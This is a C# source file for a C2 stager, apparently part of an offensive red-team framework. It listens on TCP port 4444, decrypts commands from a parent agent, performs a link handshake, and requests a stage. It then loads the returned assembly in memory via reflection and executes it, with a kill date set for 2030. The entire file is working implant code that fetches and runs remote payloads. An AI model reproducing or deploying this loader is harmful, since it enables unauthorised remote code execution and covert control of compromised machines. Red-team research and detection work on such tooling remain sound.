using Shared.Models;
using Shared.Utilities;

using Stager.Comms;
using Stager.Models;

using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading;

namespace Stager
{
    public class Stager
    {
        static string AgentID;
        static string ParentAgentID;

        static CommModule CommModule;
        static StagerModule StagerModule;

        static bool Staged = false;

        public delegate void StagerCommand(C2Data C2Data);

        public Stager()
        {
            Execute();
        }

        static void Main(string[] args)
        {
            new Stager();
        }

        public static void Execute()
        {
            AgentID = Utilities.GetRandomString(6);

            StagerModule = new StagerModule
            {
                Commands = new List<StagerModule.StagerCommand>
                {
                    new StagerModule.StagerCommand
                    {
                        Name = "Link0Request",
                        Delegate = Link0Response
                    },
                    new StagerModule.StagerCommand
                    {
                        Name = "StageResponse",
                        Delegate = StageResponse
                    }
                }
            };

            CommModule = new TCPCommModule(BindAddress, BindPort);
            CommModule.Start();

            while (!Staged)
            {
                if (CommModule.RecvData(out AgentMessage Message))
                {
                    var c2Data = Crypto.Decrypt<C2Data>(Message.Data, Message.IV);

                    var callback = StagerModule.Commands
                        .FirstOrDefault(c => c.Name.Equals(c2Data.Command, StringComparison.OrdinalIgnoreCase))
                        .Delegate;

                    callback?.Invoke(c2Data);
                }
            }
        }

        static void Link0Response(C2Data C2Data)
        {
            var link0RequestData = Encoding.UTF8.GetString(C2Data.Data);

            var placeholder = link0RequestData.Substring(0, 6);
            ParentAgentID = link0RequestData.Substring(6, 6);

            var c2Data = Utilities.SerialiseData(
                new C2Data
                {
                    Module = "Link",
                    Command = "Link0Response",
                    Data = Encoding.UTF8.GetBytes(string.Concat(placeholder, AgentID))
                });

            CommModule.SendData(
                new AgentMessage
                {
                    AgentID = ParentAgentID,
                    Data = c2Data
                });

            Thread.Sleep(5000);

            SendStage0();
        }

        static void SendStage0()
        {
            var c2Data = Crypto.Encrypt(
                new C2Data
                {
                    Module = "Core",
                    Command = "StageRequest"
                },
                out byte[] iv);

            CommModule.SendData(
                new AgentMessage
                {
                    AgentID = AgentID,
                    Data = c2Data,
                    IV = iv
                });
        }

        static void StageResponse(C2Data C2Data)
        {
            CommModule.Stop();
            Staged = true;

            var asm = Assembly.Load(C2Data.Data);

            asm.GetType("Agent.Stage").GetMethod("TCPEntry").Invoke(null, new object[]
            {
                AgentID,
                ParentAgentID,
                KillDate,
                BindAddress,
                BindPort
            });
        }

        static string BindAddress
        {
            get { return "0.0.0.0"; }
        }

        static int BindPort
        {
            get { return 4444; }
        }

        static DateTime KillDate
        {
            get { return DateTime.Parse("01/01/2030 00:00:01"); }
        }
    }
}